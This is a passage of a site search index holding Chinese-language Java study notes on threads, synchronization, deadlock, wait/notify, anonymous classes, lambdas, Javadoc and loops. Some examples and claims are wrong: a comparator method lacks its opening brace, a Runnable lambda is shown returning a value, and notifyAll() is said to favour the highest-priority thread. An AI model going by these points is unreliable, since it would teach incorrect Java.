\u3002\u8fd9\u662f\u901a\u8fc7 <code>Thread</code> \u7c7b\u5b9e\u73b0\u7684 \u3002\u6bcf\u4e2a <code>Thread</code> \u7c7b\u7684\u5b9e\u4f8b\u4ee3\u8868\u4e00\u4e2a\u65b0\u7684\u6267\u884c\u7ebf\u7a0b \u3002\u5982\u679c\u6211\u4eec\u521b\u5efa\u591a\u4e2a\u7ebf\u7a0b\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u8ba9\u4ee3\u7801\u7684\u591a\u4e2a\u90e8\u5206\u540c\u65f6\u6267\u884c \u3002\u901a\u5e38\uff0c\u6211\u4eec\u4f1a\u60f3\u8981\u6269\u5c55\u8fd9\u4e2a\u7c7b\u5e76\u91cd\u5199\u5176 <code>run()</code> \u65b9\u6cd5 \u3002</p>"},{"location":"cs/java/basics/w10/#create-a-tread","title":"Create a Tread","text":""},{"location":"cs/java/basics/w10/#ex1","title":"Ex1","text":"<pre><code>class MyThread extends Thread {\n    private int number;\n\n    public MyThread(int number) {\n        this.number = number;\n    }\n\n    @Override\n    public void run() {\n        System.out.println(\"MyThread (\" + number + \") running\");\n    }\n}\n\npublic class ThreadExample {\n    public static void main(String[] args) {\n        for (int i = 0; i &lt; 10; i++) {\n            MyThread t = new MyThread(i);\n            t.start();\n        }\n    }\n}\n</code></pre> <p>\u5b9a\u4e49\u4e00\u4e2a\u7c7b\u7ee7\u627f Thread \u7136\u540e\u6784\u9020\u51fd\u6570\u521d\u59cb\u5316\uff0c\u91cd\u8f7d run \u51fd\u6570\uff0c\u5728 ThreadExample \u7c7b\u7684 main \u65b9\u6cd5\u4e2d\u521b\u5efa\u4e86\u4e00\u4e2a\u5faa\u73af\uff0c\u5faa\u73af\u5341\u6b21\u3002\u5728\u6bcf\u6b21\u5faa\u73af\u4e2d\uff0c\u4f1a\u521b\u5efa\u4e00\u4e2a <code>MyThread</code> \u7c7b\u7684\u5b9e\u4f8b <code>t</code>\uff0c\u5e76\u4f20\u5165\u5f53\u524d\u7684\u5faa\u73af\u53d8\u91cf <code>i</code> \u4f5c\u4e3a\u7ebf\u7a0b\u7f16\u53f7 \u3002\u7136\u540e\uff0c\u8c03\u7528 <code>t.start()</code> \u65b9\u6cd5 \u3002\u4e00\u65e6\u8c03\u7528 <code>start()</code> \u65b9\u6cd5\uff0c<code>run()</code> \u65b9\u6cd5\u4e2d\u7684\u4ee3\u7801\u5c31\u4f1a\u5728\u4e00\u4e2a\u65b0\u7684\u7ebf\u7a0b\u4e2d\u5e76\u53d1\u6267\u884c \u3002\u6ce8\u610f\uff1a\u56e0\u4e3a\u7ebf\u7a0b\u8c03\u5ea6\u7684\u4e0d\u786e\u5b9a\u6027 \uff0c\u8fd0\u884c\u8fd9\u4e2a\u7a0b\u5e8f\u4f1a\u6ce8\u610f\u5230\u7ebf\u7a0b\u7684\u6267\u884c\u987a\u5e8f\u5e76\u975e\u4e25\u683c\u6309\u7167 0 \u5230 9 \u7684\u987a\u5e8f\u3002</p>"},{"location":"cs/java/basics/w10/#ex2","title":"Ex2","text":"<pre><code>class MyRunnable implements Runnable {\n    private int number;\n\n    public MyRunnable(int number) {\n        this.number = number;\n    }\n\n    @Override\n    public void run() {\n        System.out.println(\"MyThread (\" + number + \") running\");\n    }\n}\n\npublic class RunnableExample {\n    public static void main(String[] args) {\n        for (int i = 0; i &lt; 10; i++) {\n            Thread t = new Thread(new MyRunnable(i));\n            t.start();\n        }\n    }\n}\n</code></pre> <p><code>Runnable</code> \u63a5\u53e3\u4e5f\u53ef\u4ee5\u7528\u6765\u521b\u5efa\u7ebf\u7a0b\uff0c\u5b9a\u4e49\u540e\u4f7f\u7528\u6784\u9020\u51fd\u6570\u7528\u4e8e\u63a5\u53d7\u548c\u50a8\u5b58\u6574\u6570\uff0c\u91cd\u8f7d <code>run</code> \u65b9\u6cd5\u540e\u5728 <code>main</code> \u4e2d\u7528 <code>Thread</code> \u5176\u4e2d\u7684\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u53ef\u63a5\u6536 <code>Runnable</code>\u5bf9\u8c61\uff0c\u7136\u540e\u542f\u52a8\u3002\u4e00\u822c\u6765\u8bf4\u8fd9\u79cd\u65b9\u6cd5\u66f4\u53d7\u63a8\u8350\u56e0\u4e3a\u53ef\u4ee5\u591a\u91cd\u5b9e\u73b0\uff0c\u7b2c\u4e00\u4e2a\u65b9\u6cd5\u4e0d\u652f\u6301\u591a\u91cd\u7ee7\u627f\u3002</p>"},{"location":"cs/java/basics/w10/#join","title":"Join","text":"<p>\u4e00\u65e6\u6211\u4eec\u542f\u52a8\u4e86\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u6709\u65f6\u9700\u8981\u7b49\u5f85\u5b83\u6267\u884c\u5b8c\u6bd5\u624d\u80fd\u7ee7\u7eed\u4e3b\u7a0b\u5e8f\u7684\u540e\u7eed\u6b65\u9aa4\uff0c\u7279\u522b\u662f\u5f53\u540e\u7eed\u6b65\u9aa4\u4f9d\u8d56\u4e8e\u8be5\u7ebf\u7a0b\u7684\u6267\u884c\u7ed3\u679c\u65f6 \u3002\u4f8b\u5982\uff0c\u5982\u679c\u4f60\u521b\u5efa\u4e86\u4e24\u4e2a\u7ebf\u7a0b\u5206\u522b\u4ece\u4e24\u4e2a\u4e0d\u540c\u7684\u6570\u636e\u5e93\u8bfb\u53d6\u6570\u636e\uff0c\u4f60\u53ef\u80fd\u9700\u8981\u7b49\u5f85\u4e24\u4e2a\u7ebf\u7a0b\u90fd\u8fd4\u56de\u7ed3\u679c\u540e\u624d\u80fd\u7ee7\u7eed\u7a0b\u5e8f\u7684\u4e0b\u4e00\u6b65\u64cd\u4f5c \u3002</p> <ul> <li>Java \u63d0\u4f9b\u4e86 <code>join()</code> \u65b9\u6cd5\uff1a\u4e00\u4e2a\u7ebf\u7a0b\u5b8c\u6210\u4e86 <code>run()</code> \u65b9\u6cd5\u6267\u884c\u540e\u8c03\u7528 <code>join()</code> \u5c31\u4f1a\u4f7f\u5f53\u524d\u7ebf\u7a0b\u7b49\u5f85\u76f4\u5230\u7ebf\u7a0b\u6267\u884c\u5b8c\u6bd5</li> </ul> <pre><code>public class JoinExample {\n    public static void main(String[] args) {\n        Thread[] threads = new Thread[10];\n        for (int i = 0; i &lt; 10; i++) {\n            threads[i] = new MyThread(i);\n            threads[i].start();\n        }\n\n        for (int i = 0; i &lt; 10; i++) {\n            try {\n                threads[i].join();\n            } catch (InterruptedException e) {}\n        }\n        System.out.println(\"All threads finished\");\n    }\n}\n</code></pre> <p>\u5341\u4e2a\u7ebf\u7a0b\u5168\u90e8\u6267\u884c\u5b8c\u6bd5\u540e\u624d\u4f1a\u88ab\u6253\u5370\u51fa\u6765\u3002<code>join()</code> \u65b9\u6cd5\u4f1a\u629b\u51fa\u4e00\u4e2a <code>InterruptedException</code> (\u68c0\u67e5\u578b\u5f02\u5e38) \u3002\u8fd9\u79cd\u60c5\u51b5\u4f1a\u5728\u4e00\u4e2a\u7ebf\u7a0b\u7684\u6267\u884c\u4ee5\u975e\u9884\u671f\u7684\u65b9\u5f0f\u7ed3\u675f\u65f6\u53d1\u751f </p>"},{"location":"cs/java/basics/w10/#race-condition","title":"Race condition","text":"<p>Race Condition: \u5f53\u4e24\u4e2a\u6216\u591a\u4e2a\u7ebf\u7a0b\u8bd5\u56fe\u540c\u65f6\u5bf9\u5171\u4eab\u6570\u636e\u8fdb\u884c\u64cd\u4f5c\uff0c\u5e76\u4e14\u64cd\u4f5c\u7684\u6267\u884c\u987a\u5e8f\u4f1a\u5f71\u54cd\u6700\u7ec8\u7ed3\u679c\u65f6\uff0c\u5c31\u53d1\u751f\u4e86\u7ade\u6001\u6761\u4ef6\u3002\u6bcf\u6b21\u8fd0\u884c\u7a0b\u5e8f\u7ed3\u679c\u90fd\u4e0d\u540c\u56e0\u6b64\u4e00\u4e0d\u5c0f\u5fc3\u5c31\u53d8\u6210\u4e86 bug\u3002</p>"},{"location":"cs/java/basics/w10/#ex1_1","title":"Ex1","text":"<pre><code>class SpecialInt {\n    private int value;\n\n    public SpecialInt(int value) {\n        this.value = value;\n    }\n\n    public int getValue() {\n        return value;\n    }\n\n    public void increment() {\n        value++;\n    }\n}\n</code></pre> <pre><code>class AddThread extends Thread {\n    private SpecialInt specialInt;\n\n    public AddThread(SpecialInt specialInt) {\n        this.specialInt = specialInt;\n    }\n\n    public void run() {\n        for (int i = 0; i &lt; 1000000; i++) {\n            specialInt.increment();\n        }\n    }\n}\n</code></pre> <pre><code>public class RaceCondition {\n    public static void main(String[] args) {\n        SpecialInt specialInt = new SpecialInt(0);\n        Thread t1 = new AddThread(specialInt);\n        Thread t2 = new AddThread(specialInt);\n\n        t1.start();\n        t2.start();\n\n        try {\n            t1.join();\n            t2.join();\n        } catch (InterruptedException e) {}\n\n        System.out.println(specialInt.getValue());\n    }\n}\n</code></pre> <p>\u8fd9\u4e2a\u7a0b\u5e8f\u4f1a\u5bfc\u81f4\u5927\u91cf\u7684\u7ade\u6001\u6761\u4ef6 \u3002\u5982\u679c\u4f60\u8fd0\u884c\u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u4f1a\u53d1\u73b0\u8f93\u51fa\u7ed3\u679c\u901a\u5e38\u4e0d\u662f2,000,000 \u3002\u8fd9\u662f\u56e0\u4e3a <code>specialInt.increment()</code> \u64cd\u4f5c\uff08\u5373 <code>value++</code>\uff09\u4e0d\u662f\u539f\u5b50\u6027\u7684\u3002\u5b83\u5b9e\u9645\u4e0a\u5305\u542b\u4e09\u4e2a\u6b65\u9aa4\uff1a\u8bfb\u53d6 <code>value</code> \u7684\u5f53\u524d\u503c\uff0c\u5c06\u8be5\u503c\u52a01\uff0c\u7136\u540e\u5c06\u65b0\u503c\u5199\u56de <code>value</code>\u3002\u591a\u4e2a\u7ebf\u7a0b\u7684\u8fd9\u4e09\u4e2a\u6b65\u9aa4\u53ef\u80fd\u4f1a\u4ea4\u9519\u6267\u884c\uff0c\u5bfc\u81f4\u67d0\u4e9b\u589e\u52a0\u64cd\u4f5c\u4e22\u5931\u3002</p> <ul> <li>Good: Thread A reads 0, A writes 1, B reads 1, B writes 2</li> </ul> <ul> <li>Bad: Thread A reads 0, B reads 0, A writes 1, B writes 1</li> </ul>"},{"location":"cs/java/basics/w10/#synchronized","title":"Synchronized","text":"<pre><code>synchronized (object) {\n    // ... code ...\n}\n</code></pre> <p>Java \u63d0\u4f9b\u540c\u6b65\u8bed\u53e5\uff0c\u5f53\u4e00\u4e2a\u7ebf\u7a0b\u8fdb\u5165\u8fd9\u4e2a\u4ee3\u7801\u5757\u65f6\uff0c\u5b83\u4f1a\u5c1d\u8bd5\u83b7\u53d6 <code>object</code> \u5bf9\u8c61\u4e0a\u7684\u9501\u3002</p> <ul> <li>\u5982\u679c\u8be5\u5bf9\u8c61\u5df2\u7ecf\u88ab\u5176\u4ed6\u7ebf\u7a0b\u9501\u5b9a\uff0c\u90a3\u4e48\u5f53\u524d\u7ebf\u7a0b\u5c06\u4f1a\u7b49\u5f85\uff0c\u76f4\u5230\u8be5\u5bf9\u8c61\u88ab\u91ca\u653e</li> <li>\u7ebf\u7a0b\u9501\u5b9a\u5bf9\u8c61\u3001\u6267\u884c\u4ee3\u7801\u5757\u4ee3\u7801\u3001\u88ab\u89e3\u9501</li> </ul> <p>\u8be5\u5b57\u6bb5\u6709\u6548\u907f\u514d\u4e86\u7ade\u6001</p> <pre><code>class AddThread extends Thread {\n    private SpecialInt specialInt;\n\n    public AddThread(SpecialInt specialInt) {\n        this.specialInt = specialInt;\n    }\n\n    public void run() {\n        for (int i = 0; i &lt; 1000000; i++) {\n            synchronized (specialInt) {\n                specialInt.increment();\n            }\n        }\n    }\n}\n</code></pre> <p>\u4ee5\u4e0a\u8fd9\u4e2a\u65b9\u6cd5\u662f\u5728\u8c03\u7528\u671f\u95f4\u7ed9 <code>object</code> \u4e34\u65f6\u8bbe\u7f6e\u540c\u6b65\uff0c\u76f4\u63a5\u5728\u539f\u7c7b\u76f4\u63a5\u8bbe\u7f6e method \u4e3a\u540c\u6b65\u4e00\u6837\u6709\u6548</p> <pre><code>class SpecialInt {\n    private int value;\n\n    public SpecialInt(int value) {\n        this.value = value;\n    }\n\n    public int getValue() {\n        return value; //\n    }\n\n    public synchronized void increment() { //\n        value++;\n    }\n}\n</code></pre> <p>\u4e24\u8005\u540c\u6837\u5b89\u5168\u6709\u6548</p>"},{"location":"cs/java/basics/w10/#deadlock","title":"Deadlock","text":"<p>\u7531\u4e8e Java \u7684\u540c\u6b65\u5173\u952e\u5b57\u53ea\u9488\u5bf9\u5355\u4e2a\u5bf9\u8c61\uff1a\u7ebf\u7a0b A \u6301\u6709\u5bf9\u8c61 1 \u7684\u9501\uff0c\u60f3\u8981\u83b7\u53d6\u5bf9\u8c61 2 \u7684\u9501\uff1b\u540c\u65f6 B \u6301\u6709\u5bf9\u8c61 2 \u7684\u9501\u5e76\u4e14\u60f3\u8981\u83b7\u53d6\u5bf9\u8c61 1 \u7684\u9501\u3002\u8fd9\u79cd\u60c5\u51b5\u4f1a\u6c38\u8fdc\u7b49\u5f85\u4e0b\u53bb\u5bfc\u81f4\u6b7b\u9501\uff0c\u5c31\u50cf\u4e24\u4e2a\u793c\u8c8c\u7684\u4eba\u6c38\u8fdc\u4e92\u76f8\u8c26\u8ba9\u3002</p> <pre><code>synchronized (specialInt1) { // \u5148\u83b7\u53d6 specialInt1 \u7684\u9501\n    // ...\n    synchronized (specialInt2) { // \u518d\u83b7\u53d6 specialInt2 \u7684\u9501\n        // ... \u5bf9\u4e24\u8005\u8fdb\u884c\u64cd\u4f5c ...\n    }\n}\n</code></pre> <p>\u56e0\u6b64\u5982\u679c\u5728\u6267\u884c\u7684\u65f6\u5019\u5b9e\u73b0\u5b89\u5168\u9501\uff0c\u53ea\u80fd\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u9010\u4e2a\u83b7\u53d6\u9501</p> <pre><code>Thread t1 = new AddBothThread(specialInt1, specialInt2); //\nThread t2 = new AddBothThread(specialInt2, specialInt1); // \u6ce8\u610f\u53c2\u6570\u987a\u5e8f\n\nt1.start();\nt2.start();\n</code></pre> <p>\u7531\u4e8e\u4f20\u9012\u53c2\u6570\u987a\u5e8f\u7684\u4e0d\u540c\u5bfc\u81f4\u4e86\u6b7b\u9501\uff1a\u7ebf\u7a0b t1 \u7b49\u5f85 t2 \u91ca\u653e\uff0c\u7ebf\u7a0b t2 \u7b49\u5f85 t1 \u91ca\u653e\u3002\u8fd9\u79cd\u60c5\u51b5\u4f1a\u6c38\u8fdc\u7b49\u5f85\u4e0b\u53bb\u5bfc\u81f4\u6b7b\u9501\uff0c\u5c31\u50cf\u4e24\u4e2a\u793c\u8c8c\u7684\u4eba\u6c38\u8fdc\u4e92\u76f8\u8c26\u8ba9\u3002\u4fee\u590d\u65b9\u6cd5\u5c31\u662f t2 \u4f20\u53c2\u987a\u5e8f\u6539\u4e3a\u4e0e t1 \u4e00\u81f4\u3002</p>"},{"location":"cs/java/basics/w10/#inter-thread-communication","title":"Inter-thread communication","text":"<p>\u5047\u8bbe\u6211\u4eec\u6709\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u5b83\u9700\u8981\u7b49\u5f85\u67d0\u4e2a\u5bf9\u8c61\u88ab\u66f4\u65b0\u540e\u624d\u80fd\u7ee7\u7eed\u6267\u884c \u3002\u8fd9\u4e2a\u7ebf\u7a0b\u9700\u8981\u91ca\u653e\u5b83\u6301\u6709\u7684\u9501\uff0c\u4ee5\u4fbf\u5176\u4ed6\u7ebf\u7a0b\u53ef\u4ee5\u66f4\u65b0\u8be5\u5bf9\u8c61 \u3002</p>"},{"location":"cs/java/basics/w10/#wait","title":"<code>wait()</code>","text":"<ul> <li><code>wait()</code> \u65b9\u6cd5\u7528\u4e8e\u5c06\u5f53\u524d\u7ebf\u7a0b\u7f6e\u4e8e\u201c\u7b49\u5f85\u201d\u72b6\u6001 \u3002</li> <li>\u5176\u5fc5\u987b\u5728 <code>synchronized</code> \u4ee3\u7801\u5757\u6216\u540c\u6b65\u65b9\u6cd5\u5185\u90e8</li> <li>\u4e00\u65e6\u8c03\u7528\u4e86 <code>wait()</code>\uff0c\u7ebf\u7a0b\u4f1a\u91ca\u653e\u5b83\u5728\u8be5\u5bf9\u8c61\u4e0a\u6301\u6709\u7684\u9501\uff0c\u5e76\u8fdb\u5165\u7b49\u5f85\u72b6\u6001\uff0c\u76f4\u5230\u53e6\u4e00\u4e2a\u7ebf\u7a0b\u5728\u8be5\u5bf9\u8c61\u4e0a\u8c03\u7528 <code>notify()</code> \u3002</li> </ul>"},{"location":"cs/java/basics/w10/#notify-and-notifyall","title":"<code>notify() and notifyAll()</code>","text":"<ul> <li><code>notify()</code>: \u5524\u9192\u5355\u4e2a\u6b63\u5728\u7b49\u5f85\u8be5\u5bf9\u8c61\u9501\u7684\u7ebf\u7a0b \u3002\u5982\u679c\u6709\u591a\u4e2a\u7ebf\u7a0b\u5728\u7b49\u5f85\uff0c\u4f1a\u4efb\u610f\u9009\u62e9\u4e00\u4e2a\u8fdb\u884c\u5524\u9192\u3002</li> <li><code>notifyAll()</code>: \u5524\u9192\u6240\u6709\u6b63\u5728\u7b49\u5f85\u8be5\u5bf9\u8c61\u9501\u7684\u7ebf\u7a0b \u3002\u4f18\u5148\u7ea7\u6700\u9ad8\u7684\u7ebf\u7a0b\u4f1a\u9996\u5148\u83b7\u5f97\u9501 \u3002</li> <li>\u540c\u6837\u4e5f\u5fc5\u987b\u5728\u540c\u6b65\u4e0a\u4e0b\u6587\u4e2d\u8c03\u7528</li> </ul>"},{"location":"cs/java/basics/w10/#produceconsume","title":"ProduceConsume","text":"<p>\u8fd9\u4e2a\u4f8b\u5b50\u6f14\u793a\u4e86\u751f\u4ea7\u8005\u6d88\u8d39\u8005\u6a21\u5f0f\uff0c\u4e00\u4e2a\u7ebf\u7a0b\u751f\u6210\u6570\u636e\uff0c\u53e6\u5916\u4e00\u4e2a\u6d88\u8d39\u6570\u636e</p> <pre><code>class ProduceConsume {\n    private String sharedResource; // \u5171\u4eab\u8d44\u6e90\n\n    // \u751f\u4ea7\u8005\u65b9\u6cd5\n    public synchronized void produce(String value) throws InterruptedException { //\n        while (sharedResource != null) {\n            // \u7b49\u5f85\u6d88\u8d39\u8005\u6d88\u8d39\u8d44\u6e90\n            wait();\n        }\n        sharedResource = value;\n        System.out.println(\"Produced: \" + value);\n        // \u901a\u77e5\u6d88\u8d39\u8005\u8d44\u6e90\u5df2\u51c6\u5907\u597d\n        notify();\n    }\n\n    // \u6d88\u8d39\u8005\u65b9\u6cd5\n    public synchronized void consume() throws InterruptedException {\n        while (sharedResource == null) {\n            // \u7b49\u5f85\u751f\u4ea7\u8005\u751f\u4ea7\u8d44\u6e90\n            wait();\n        }\n        System.out.println(\"Consumed: \" + sharedResource);\n        sharedResource = null;\n        // \u901a\u77e5\u751f\u4ea7\u8005\u8d44\u6e90\u5df2\u88ab\u6d88\u8d39\n        notify();\n    }\n}\n</code></pre> <p>\u90a3\u4e48\u8fd9\u6837\u4e00\u6765\u7ebf\u7a0b\u5728\u8c03\u7528\u8fd9\u7c7b\u65b9\u6cd5\u7684\u65f6\u5019\uff0c\u5728\u4e0d\u540c\u7c7b\u91cc\u751f\u4ea7\u5341\u6b21\u548c\u6d88\u8d39\u5341\u6b21\uff0c\u8c03\u7528\u7684\u65f6\u5019\u5c31\u53ef\u4ee5\u786e\u4fdd\u7ebf\u7a0b\u540c\u6b65\u7684\u540c\u65f6\u6570\u636e\u662f\u6b63\u786e\u88ab\u6d88\u8d39\uff0c\u6709\u4e86\u751f\u4ea7\u624d\u6709\u6d88\u8d39\u3002</p>"},{"location":"cs/java/basics/w10/#anonymous-class","title":"Anonymous Class","text":"<pre><code>class MyStringComparator implements Comparator&lt;String&gt; {\n    private static int countOccurences (String s, char c)\n        int count = 0;\n        for (int i = 0; i &lt; s.length(); i++) {\n            if (s.charAt(i) == c) {\n                count++;\n            }\n        }\n        return count;\n    }\n\n    @Override\n    public int compare (String s1, String s2) { \n        return countOccurences (s1, 'e') - countOccurences (s2, 'e'); \n    }\n}\n</code></pre> <pre><code>public class Sorting {\n    public static void main(String[] args) {\n        String[] strings = {\"elevated\", \"banana\", \"elephant\", \"early\"}; \n        Arrays.sort(strings, new MyStringComparator());\n        System.out.println(Arrays.toString(strings));\n    }\n}\n</code></pre> <p>\u6709\u65f6\u5019\u4f60\u53ea\u9700\u8981\u4e00\u4e2a\u4e00\u6b21\u6027\u7684\u5bf9\u8c61\uff0c\u533f\u540d\u7c7b\u5141\u8bb8\u5728\u4e0d\u663e\u5f0f\u58f0\u660e\u4e00\u4e2a\u65b0\u7c7b\u7684\u60c5\u51b5\u4e0b\u521b\u5efa\u4e00\u4e2a\u81ea\u5b9a\u4e49\u5bf9\u8c61 \u3002\u8fd9\u5728\u5b8c\u6574\u7c7b\u5b9a\u4e49\u4f1a\u663e\u5f97\u7e41\u7410\u7684\u60c5\u51b5\u4e0b\u7279\u522b\u6709\u7528\u3002<code>Arrays.sort(array, comparator)</code> \u65b9\u6cd5\u4f7f\u7528 <code>Comparator&lt;T&gt;</code> \u7684\u5b9e\u4f8b\u6765\u5bf9\u6570\u7ec4\u8fdb\u884c\u6392\u5e8f \u3002\u8fd9\u4e2a\u63a5\u53e3\u53ea\u6709\u4e00\u4e2a\u9700\u8981\u5b9e\u73b0\u7684\u65b9\u6cd5\uff0c\u5373 <code>compare(a, b)</code> \u3002\u53ea\u662f\u4e3a\u4e86\u5b9e\u73b0\u8fd9\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u770b\u5230\u5c31\u8981\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 <code>MyStringComparator</code>\u3002</p> <pre><code>public class AnonymousSorting {\n    private static int countOccurences (String s, char c) { \n        int count = 0;\n        for (int i = 0; i &lt; s.length(); i++) { \n            if (s.charAt(i) == c) count++; \n        }\n        return count; \n    }\n\n    public static void main(String[] args) {\n        String[] strings = {\"elevated\", \"banana\", \"elephant\", \"early\"}; \n        Arrays.sort(strings, new Comparator&lt;String&gt;() { \n            public int compare (String s1, String s2) { \n                return countOccurences (s1, 'e') - countOccurences (s2, 'e'); \n            }\n        }); \n        System.out.println(Arrays.toString(strings)); \n    }\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u8bed\u6cd5\u662f\u4ee5\u4e0b\u8fd9\u6837\u975e\u5e38\u7b80\u6d01\uff0c\u751a\u81f3\u53ef\u4ee5 extends a class</p> <pre><code>new ExistingClassOrInterface (arg1, arg2) {\n    // override methods here\n    // you can add fields too\n}\n</code></pre>"},{"location":"cs/java/basics/w10/#lambda-expression","title":"Lambda Expression","text":"<p>\u672c\u8d28\u4e0a\u662f\u533f\u540d\u65b9\u6cd5\u6216\u51fd\u6570\uff0c\u73b0\u5728\u72b9\u8c6b\u5176\u66f4\u65b9\u4fbf\uff0c\u7ecf\u5e38\u53d6\u4ee3\u533f\u540d\u7c7b</p> <pre><code>(parameter) -&gt; expression\n(param1, param2) -&gt; expression\n</code></pre> <pre><code>Comparator&lt;String&gt; comp = (s1, s2) -&gt; s1.length() - s2.length();\n</code></pre> <p>\u76f4\u63a5\u521b\u5efa\u4e00\u4e2a <code>Comparator</code> \u6765\u6839\u636e\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u6bd4\u8f83\u4e24\u4e2a\u5b57\u7b26\u4e32\uff0c\u7701\u7565\u7c7b\u578b\u8ba9\u5176\u81ea\u52a8\u63a8\u65ad</p> <pre><code>public class LambdaSorting {\n    private static int countOccurences (String s, char c) { \n        int count = 0; \n        for (int i = 0; i &lt; s.length(); i++) { \n            if (s.charAt(i) == c) count++; \n        }\n        return count; \n    }\n\n    public static void main(String[] args) {\n        String[] strings = {\"elevated\", \"banana\", \"elephant\", \"early\"}; \n        Arrays.sort(strings, (s1, s2) -&gt; countOccurences(s1, 'e') - countOccurences(s2, 'e')); \n        System.out.println(Arrays.toString(strings)); \n    }\n}\n</code></pre> <p>\u56e0\u6b64\u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u6bd4\u8f83\u7248\u672c\u7684\u8fc7\u8f7d\u662f\u6700\u7b80\u5355\u7684\u975e\u5e38\u7d27\u51d1\uff0c\u65b9\u6cd5\u91cc\u7684\u53c2\u6570\u751a\u81f3\u4e0d\u7528\u5199\u7c7b\u578b\u81ea\u52a8\u63a8\u65ad</p>"},{"location":"cs/java/basics/w10/#details","title":"Details","text":"<p>\u53ef\u4ee5\u4e0d\u63a5\u53d7\u53c2\u6570\u3001\u591a\u4e2a expressions\uff0c\u4f46\u662f\u5982\u679c\u662f\u591a\u4e2a\u53c2\u6570\u4e2d\u7684 expressions \u6709 return \u8bed\u53e5\u5fc5\u987b\u663e\u793a</p> <pre><code>public class LambdaRunnable {\n    public static void main(String[] args) {\n        Runnable r = () -&gt; {\n            System.out.println(\"Hello, world!\"); \n            return 1;\n        }; \n        r.run(); \n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w10/#javadoc","title":"Javadoc","text":"<p>Javadoc \u662f\u4e00\u4e2a\u53ef\u4ee5\u4ece Java \u6e90\u4ee3\u7801\u76f4\u63a5\u81ea\u52a8\u751f\u6210 HTML \u683c\u5f0f API \u6587\u6863\u7684\u5de5\u5177 \u3002\u4f60\u9700\u8981\u5c06 Javadoc \u6ce8\u91ca\u653e\u5728\u7c7b\u3001\u5b57\u6bb5\u548c\u65b9\u6cd5\u58f0\u660e\u7684\u6b63\u524d\u65b9\uff0c\u683c\u5f0f\u5982\u4e0b\uff1a</p> <pre><code>/**\n * \u8fd9\u662f\u4e00\u4e2a Javadoc \u6ce8\u91ca\u3002\n * \u5b83\u63cf\u8ff0\u4e86\u5b83\u524d\u9762\u7684\u7c7b\u3001\u65b9\u6cd5\u6216\u5b57\u6bb5\u3002\n */\n</code></pre> <p>\u5176\u6ce8\u91ca\u53ef\u4ee5\u5305\u542b\u6807\u7b7e (tags) \u4ee5\u63d0\u4f9b\u5173\u4e8e\u4ee3\u7801\u66f4\u5177\u4f53\u7684\u4fe1\u606f\uff0c\u4e0b\u8ff0\u4e3a method \u7248\u672c\u6ce8\u91ca</p> <pre><code>/**\n * \u8fd9\u4e2a\u65b9\u6cd5\u505a\u67d0\u4e8b\u3002 \n *\n * @param param \u53c2\u6570\u7684\u63cf\u8ff0 \n * @return \u8fd4\u56de\u503c\u7684\u63cf\u8ff0 \n * @throws ExceptionType \u4f55\u65f6\u4f1a\u629b\u51fa\u8be5\u5f02\u5e38 \n */\npublic ReturnType methodName (Type param) throws ExceptionType {\n    // \u65b9\u6cd5\u4f53\n}\n</code></pre> <p>\u8fd9\u4e2a\u7248\u672c\u662f\u7c7b\u7684\uff1a</p> <pre><code>/**\n * \u8fd9\u662f\u4e00\u4e2a\u7c7b\u4e0a\u7684 Javadoc \u6ce8\u91ca\u793a\u4f8b\u3002 \n */\npublic class Javadoc {\n\n    /**\n     * \u5982\u679c\u7ed9\u5b9a\u7684\u6574\u6570\u662f\u5076\u6570\uff0c\u6b64\u65b9\u6cd5\u8fd4\u56de true\uff0c\u5426\u5219\u8fd4\u56de false\u3002 \n     * @param x \u8981\u68c0\u67e5\u7684\u6574\u6570 \n     * @return \u5982\u679c x \u662f\u5076\u6570\u5219\u8fd4\u56de true\uff0c\u5426\u5219\u8fd4\u56de false \n     */\n    public boolean isEven (int x) {\n        return x % 2 == 0; // \n    }\n}\n</code></pre> <p>\u8981\u4ece Java \u6587\u4ef6\u4e2d\u76f4\u63a5\u751f\u6210 HTML \u6587\u6863\uff0c\u5b98\u65b9\u6587\u6863\u5c31\u662f\u5982\u6b64\u751f\u6210\uff1a</p> <pre><code>javadoc Javadoc.java -d mydocs \n</code></pre> <p><code>mydocs</code> \u662f\u6587\u4ef6\u5939\u540d</p>"},{"location":"cs/java/basics/w4/","title":"4.0 Loop","text":""},{"location":"cs/java/basics/w4/#switch","title":"Switch","text":"<pre><code>import java.util.Scanner;\n\npublic class Switch {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter a number: \");\n        int num = scanner.nextInt();\n        switch (num) {\n            case 1:\n                System.out.println(\"One\");\n                break;\n            case 2:\n                System.out.println(\"Two\");\n                break;\n            case 3:\n                System.out.println(\"Three\");\n                break;\n            default:\n                System.out.println(\"Other\");\n        }\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w4/#while","title":"While","text":"<pre><code>import java.util.Scanner;\n\npublic class Break {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        while (true) {\n            System.out.print(\"Are you ready for this program to end? Enter true or false: \");\n            boolean answer = scanner.nextBoolean();\n            if (answer)\n                break;\n        }\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w4/#do-while-loops","title":"Do-while loops","text":"<pre><code>import java.util.Scanner;\n\npublic class DoWhile {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        boolean answer; // Note that this variable is declared outside the loop.\n        do {\n            System.out.print(\"Are you ready for this program to end? Enter true or false: \");\n            answer = scanner.nextBoolean();\n        } while (!answer);\n    }\n}\n</code></pre> <p>\u65e0\u8bba\u662f Python \u8fd8\u662f Java \u90fd\u662f\u5f53 While \u4e2d\u7684\u6761\u4ef6\u6ee1\u8db3\u65f6\u7ee7\u7eed\u6267\u884c\u8be5 Loop</p> <p><code>while (i &lt;=10)</code> \u5f53 i \u5c0f\u4e8e 10 \u65f6\u7ee7\u7eed\u6267\u884c\u8be5\u5faa\u73af\uff0c\u6216\u76f4\u63a5\u5f53\u8fd9\u4e2a\u6761\u4ef6\u4e3a true 